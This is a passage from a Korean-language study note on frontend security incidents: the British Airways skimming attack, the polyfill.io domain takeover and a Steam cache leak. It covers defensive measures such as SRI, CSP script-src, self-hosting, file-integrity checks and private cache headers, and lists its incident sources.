- **원인**: 다른 출처 스크립트에 `crossorigin` 속성이 없다. 또는 그 서버가 `Access-Control-Allow-Origin`을 주지 않는다.
- **대처**: `crossorigin="anonymous"`를 붙이고, 공급자가 CORS 헤더를 주는지 확인한다. 주지 않으면 자체 호스팅한다.

### 3. CSP를 걸었는데도 사용자가 다른 사이트로 튕긴다

- **현상**: `connect-src`를 좁혔는데 모바일 사용자가 낯선 사이트로 이동한다는 신고.
- **보이는 형태**: CSP 위반 보고는 없다. 사이트 운영자 데스크톱에서는 재현되지 않는다.
- **원인**: 이동은 `location.href` 같은 최상위 이동이라 `connect-src` 대상이 아니다(실험 8번). 코드가 모바일·시간·관리자 쿠키 조건으로만 동작한다(polyfill.io 표본).
- **대처**: `script-src`에서 그 도메인을 빼고, 실린 스크립트를 모바일 User-Agent로 따로 수집한다. 외부 런타임 의존을 자체 호스팅으로 바꾼다.

### 4. 변조를 몇 주 동안 아무도 모른다

- **현상**: 결제·로그인은 정상, 에러율도 0이다. 외부 제보로 처음 안다.
- **보이는 형태**: 서버 로그는 정상 결제만, 프론트엔드 오류 0(BA 15일 — ICO 3.25~3.26).
- **원인**: 변조가 사용자 흐름을 깨지 않는다. 가용성 지표는 무결성 문제를 보지 못한다.
- **대처**: 서빙 중인 정적 파일의 해시를 배포 산출물과 주기적으로 비교한다. CSP 위반 보고를 모은다. 결제 페이지에 실리는 스크립트 목록이 바뀌면 알린다.

### 5. 장애 대응 중 바꾼 캐시 규칙이 개인 페이지를 공유한다

- **현상**: 트래픽 폭주 대응 직후 "다른 사람 계정이 보인다", "첫 화면이 다른 언어로 나온다".
- **보이는 형태**: 서버 로그에 그 사용자의 요청이 없다. 응답에 `Age` 헤더·CDN 캐시 적중 표시가 붙어 있다(Steam 2015 — 10-2, 이 진단 신호는 해석).
- **원인**: 캐시 키가 URL뿐이고 인증·언어가 빠졌다. 개인화 응답에 `private`가 없었다.
- **대처**: 서비스를 내리고 캐시 규칙을 되돌린 뒤 엣지 캐시를 퍼지하고 완료를 확인한다. 이후 개인화 응답엔 서버가 `private`/`no-store`를 붙이고, 쿠키 다른 두 계정 비교 검사를 규칙 변경 절차에 넣는다.

## 핵심 문장

- `<script>`로 실은 코드는 출처가 어디든 그 페이지의 권한으로 돈다. 동일 출처 정책은 남의 응답을 읽는 것을 막을 뿐, 내가 실은 코드를 막지 않는다.
- BA 2018은 1st party JS 파일 하나의 끝에 덧붙은 코드가 결제 흐름을 깨지 않고 15일간 카드 정보를 복사한 사건이다(ICO). 탐지 대책으로 ICO는 file integrity monitoring을 들었다.
- polyfill.io 2024는 코드가 아니라 URL의 주인이 바뀐 사건이다. 응답이 User-Agent마다 달라 SRI로 고정하기 어렵고, 자체 호스팅이 근본 대책이다.
- SRI는 실패 시 닫힌다(유출 대신 기능 장애). 다른 출처면 `crossorigin`과 CORS 헤더가 함께 필요하다(실험 3·7).
- CSP `connect-src`는 다른 출처로의 연결을 막지만 최상위 이동은 막지 않는다(실험 4·8). 막을 곳은 `script-src`다.
- Steam 2015는 장애 대응 중 캐시 규칙 변경이 인증 페이지를 공유 캐시에 넣은 사건이다. 개인화 응답의 `private`는 CDN 규칙이 아니라 서버가 붙인다.

## 관련 주제·근거

- 선행: [23 증상 색인](../23-web-symptom-index/2-summary.md) — §11(교차 노출·토큰 유출)·장애 시나리오 3(재현 안 됨)
- 이 영역 leaf: [01 브라우저 아키텍처](../01-browser-architecture/2-summary.md)(출처·사이트 격리) · [05 fetch](../05-fetch-from-browser/2-summary.md)(CORS) · [06 저장소](../06-browser-storage/2-summary.md)(06-1 토큰 탈취) · [07 서비스 워커](../07-service-workers-and-offline/2-summary.md)(캐시 고착) · [09 모듈·번들링](../09-js-modules-and-bundling/2-summary.md)(자체 호스팅·해시 파일명) · [10 렌더링 전략](../10-rendering-strategies/2-summary.md)(10-2 Steam) · [12 국제화](../12-internationalization-and-localization/2-summary.md)(언어별 응답) · [14 이미지](../14-image-optimization/2-summary.md)(14-4 `Vary`) · [15 웹 폰트](../15-web-font-loading/2-summary.md)(15-4 `crossorigin`)
- 다른 영역: security 19 `xss-and-csp`·21 `same-origin-and-cors`·25 `supply-chain-security` — 미작성, [security 영역 표](../../security/README.md) · [network/34 HTTP 캐시](../../network/34-http-caching/2-summary.md) · [reliability/26 사고 대응·포스트모템](../../reliability/26-incident-response-and-postmortem/2-summary.md) · 같은 형식의 다른 영역 사건 노트 [api-design/29](../../api-design/29-api-incidents/2-summary.md)
- Web API 문법(읽기 전용): [web-api/28 CORS](../../../languages/web-api/28-cors-simple-and-preflight/) · [web-api/29 credentials](../../../languages/web-api/29-credentials-and-cookies/)
- 사건 출처
  - ICO, Penalty Notice — British Airways plc, 2020-10-16 <https://ico.org.uk/media2/migrated/2618421/ba-penalty-20201016.pdf> — 1.2, 3.4~3.29, 4.1, 5.2~5.3, 6.92~6.93, 1.7
  - (2차) RiskIQ, "Inside the Magecart Breach of British Airways", 2018-09-11, Internet Archive 사본 <https://web.archive.org/web/20181231220607/https://www.riskiq.com/blog/labs/magecart-british-airways-breach/>
  - Sansec, "Polyfill supply chain attack hits 100K+ sites", 2024-06-25 <https://sansec.io/research/polyfill-supply-chain-attack>
  - Cloudflare Blog, "Automatically replacing polyfill.io links with Cloudflare's mirror for a safer Internet", 2024-06-26 <https://blog.cloudflare.com/automatically-replacing-polyfill-io-links-with-cloudflares-mirror-for-a-safer-internet/>
  - Valve, "Update on Christmas Issues", 2015-12-30 <https://store.steampowered.com/news/19852/>
  - PCI SSC Blog, "New Information Supplement: Payment Page Security and Preventing E-Skimming" <https://blog.pcisecuritystandards.org/new-information-supplement-payment-page-security-and-preventing-e-skimming>
- 표준·문서: W3C "Subresource Integrity" <https://www.w3.org/TR/SRI/> · W3C "Content Security Policy Level 3" <https://www.w3.org/TR/CSP3/> · MDN "Subresource Integrity" <https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity>
- 실험 목록
  - 24-A 변조된 스크립트와 SRI·CSP(8가지 경우) — Node `http` 서버 3개(127.0.0.1, 사이트·"CDN"·수집), Playwright `playwright-core` + `/usr/bin/google-chrome` 151.0.7922.173 headless, 경우마다 새 컨텍스트, 더미 데이터만. 2026-10-04, 2회 실행 같은 결과.
